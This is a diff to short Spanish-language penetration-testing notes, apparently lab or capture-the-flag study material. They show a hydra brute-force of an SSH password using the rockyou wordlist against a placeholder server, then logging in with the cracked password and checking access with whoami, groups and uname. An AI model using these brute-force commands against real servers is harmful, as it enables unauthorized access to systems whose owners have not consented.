@@ -9,3 +9,11 @@
 ++ hydra -l <nombre_usuario> -P rockyou.txt ssh://<ip_servidor>
 --- Nota: La l minúscula significa que se conoce el usuario
 ++ Aparecerán las credenciales asociadas al servidor 
+++ ssh <usuario>@<ip_servidor>
+++ Ingresar contraseña encontrada
+++ Ya se tiene acceso al servidor, comprobar con los siguientes comandos:
+--- whoami
+--- groups
+++ uname -r (Nos muestra información sobre la versión de linux)
+++ uname -a (Nos muestra información más detallada sobre el sistema)
+++ 
